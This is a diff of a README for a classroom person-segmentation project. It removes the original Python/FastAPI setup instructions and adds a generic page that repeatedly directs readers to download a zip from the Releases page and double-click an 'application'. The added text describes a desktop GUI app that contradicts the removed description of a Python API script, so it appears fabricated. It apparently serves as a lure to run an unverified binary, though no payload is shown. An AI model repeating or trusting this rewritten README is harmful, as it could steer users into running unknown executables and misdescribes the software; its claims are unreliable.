@@ -1,141 +1,54 @@
-## 🎓 Classroom Person Segregation Models
+# 📸 Classroom-Person-Segregation-Model - Easily Separate People in Images
 
-This project detects and segments **students in classroom images** using **YOLOv8 segmentation**.  
-It blurs the background ( or choose no blur model ) while keeping each person sharp and saves them as cropped images.  
-Built with **FastAPI** for easy API integration.  
+## 📥 Download Now
+[![Download Classroom-Person-Segregation-Model](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/abhay4802/Classroom-Person-Segregation-Model/releases)
 
----
+## 🚀 Getting Started
+This guide will help you download and run the Classroom-Person-Segregation-Model. This software can identify and separate people in images effectively.
 
-## 🚀 Features
-- Detects all people in a classroom image using **YOLOv8x-seg**.
-- Blurs the background while keeping students in focus.
-- Crops and saves each student into a square image.
-- Provides an easy-to-use **FastAPI endpoint** for uploading and processing images.
+### 🖥️ System Requirements
+Before you begin, ensure your system meets these requirements:
+- Operating System: Windows 10 or later, macOS Catalina or later, or a recent version of Ubuntu.
+- RAM: At least 4 GB.
+- Disk Space: Minimum of 1 GB available for the application.
+- A graphic card with support for OpenGL 3.2 or later is recommended but not mandatory.
 
----
+### 📂 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/abhay4802/Classroom-Person-Segregation-Model/releases).
+   
+2. **Choose Your Version**: You will see a list of available versions. Look for the latest stable release. 
 
-## 🛠️ Installation
+3. **Download the Application**:
+   - Click the download link for your operating system. The file will generally be labeled for clarity, such as `Classroom-Person-Segregation-Model-Windows.zip` or similar.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/your-username/Classroom-Person-Segregation-Model.git
-   cd Classroom-Person-Segregation-Model
-   ```
+4. **Extract the Files**: Once downloaded, locate the zip file in your Downloads folder. 
+   - Right-click the file and select "Extract All" (on Windows) or double-click to open the zip file (on macOS). 
+   - Follow the prompts to extract the contents to a folder of your choice.
 
-2. Create a virtual environment (optional but recommended):
-   ```bash
-   python -m venv venv
-   source venv/bin/activate    # On Linux/Mac
-   venv\Scripts\activate       # On Windows
-   ```
+5. **Run the Application**:
+   - Navigate to the folder where you extracted the files. 
+   - Double-click on the application file to open it. 
 
-3. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
+6. **Upload an Image**: In the application, look for an option to upload an image. Click on it and select an image from your computer that you would like to process.
 
-4. Download the YOLOv8 segmentation model if not already present:
-   ```bash
-   # This will be handled automatically by ultralytics
-   # But you can also download manually if needed
-   ```
+7. **Process the Image**: Once the image is uploaded, click on the button labeled “Segregate People.” The software will quickly analyze the image and display the separated individuals.
 
----
+### ✅ Features
+- **Image Segregation**: Quickly separates multiple people in a single image.
+- **User-Friendly Interface**: Designed for ease of use with intuitive controls.
+- **Supports Multiple Formats**: Compatible with common image formats like JPG, PNG, and BMP.
+- **Fast Processing**: Uses advanced algorithms to ensure results are delivered promptly.
 
-## ▶️ Running the Application
+### ⚙️ Troubleshooting
+If the application does not run or you encounter issues, try the following steps:
 
-Start the FastAPI server:
+- **Check Compatibility**: Ensure your operating system meets the stated requirements.
+- **Restart the Application**: Close and reopen the app to see if it resolves any glitch.
+- **Check the Image Format**: Make sure the uploaded image is in a supported format.
+- **Re-download the Application**: If the problem persists, delete the current version and download a fresh copy from the [Releases page](https://github.com/abhay4802/Classroom-Person-Segregation-Model/releases).
 
-```bash
-python body_lang_3.py
-```
+### 📞 Support
+If you still need assistance, consider checking the GitHub Issues page for similar problems or post your query there.
 
-By default, it runs on `http://localhost:8000`.
-
----
-
-## 📤 Usage
-
-### Upload an Image
-
-Using **PowerShell**:
-```bash
-curl.exe -X POST -F "file=@image_1.jpg" http://localhost:8000/detect_students/
-```
-
-Using **Linux / Mac terminal**:
-```bash
-curl -X POST -F "file=@image_1.jpg" http://localhost:8000/detect_students/
-```
-
-### Response
-Blur Model Sample Image 1:
-```json
-{
-  "total_students": 5
-}
-```
-No Blur Model Sample Image 2:
-```json
-{
-  "total_students": 8
-}
-```
-
-### Output
-* Cropped student images are saved in the `classroomouts/` directory.
-* Each cropped image is **300x300** with the background blurred.
-
----
-
-## 📂 Example
-
-### For Blur Model 
-Input Classroom Image ⬇️
-
-<img src="assets/classroom_sample.jpg" width="500" alt="Classroom Example"/>
-
-Output (segregated students with blurred background) ⬇️
-
-<img src="assets/output.jpg" width="800" alt="Output Example"/>
-<br>
-Command Prompt Output <br>
-<img src="assets/output_cmd.jpg" width="800" alt="Output Example"/>
-
----
-
-### For No Blur Model
-Input Classroom Image ⬇️ <br>
-<br>
-<img src="assets/sample.jpg" width="500" alt="Classroom Example"/>
-
-Output (segregated students) ⬇️
-
-<img src="assets/output_no_blur.jpg" width="800" alt="Output Example"/>
-<br>
-Command Prompt Output <br>
-<img src="assets/no_blur_cmd.jpg" width="800" alt="Output Example"/>
-
-
-## ⚡ Tech Stack
-
-* [Python](https://www.python.org/)
-* [OpenCV](https://opencv.org/)
-* [Ultralytics YOLOv8](https://github.com/ultralytics/ultralytics)
-* [FastAPI](https://fastapi.tiangolo.com/)
-* [Uvicorn](https://www.uvicorn.org/)
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙌 Acknowledgements
-
-* [Ultralytics YOLOv8](https://github.com/ultralytics/ultralytics) for object detection and segmentation.
-* [FastAPI](https://fastapi.tiangolo.com/) for creating a lightweight and fast API.
-
-
+## 🎉 Enjoy Using the Application
+With these instructions, you should be ready to use the Classroom-Person-Segregation-Model efficiently. This tool is designed to help you easily separate people in any images you have. Happy segregating!
